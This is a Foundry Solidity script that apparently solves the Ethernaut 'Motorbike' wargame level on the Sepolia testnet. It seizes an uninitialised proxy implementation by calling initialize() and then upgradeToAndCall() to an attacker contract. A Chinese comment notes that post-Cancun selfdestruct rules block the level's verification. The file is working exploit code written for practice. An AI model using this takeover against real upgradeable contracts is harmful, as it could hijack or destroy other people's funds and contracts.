// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked25_Engine.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked25_MotorbikeScript --broadcast
contract Cracked25_MotorbikeScript is Script {
    address ethernaut_Motorbike_contracts;
    address ethernaut_Engine_contracts;

    function setUp() public {
        ethernaut_Motorbike_contracts = vm.parseAddress(vm.envString("Motorbike_address"));
        ethernaut_Engine_contracts = vm.parseAddress(vm.envString("Motorbike_Engine_address"));
    }

    //坎昆升级后自毁仅构造函数删代码，函数不删代码，ethernaut无法验证通过
    function run() public {
        vm.startBroadcast();
        Cracked25_Engine attack = new Cracked25_Engine();
        // bytes memory aa = abi.encodeWithSignature("newInit()");
        // xx = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", 0xa50f8Dd36D96049BBbb831C498DC5dB42E7449F5, aa);
        IEngine(ethernaut_Engine_contracts).initialize();
        IEngine(ethernaut_Engine_contracts).upgradeToAndCall(address(attack), "");
        attack.newInit();

        vm.stopBroadcast();
    }
}
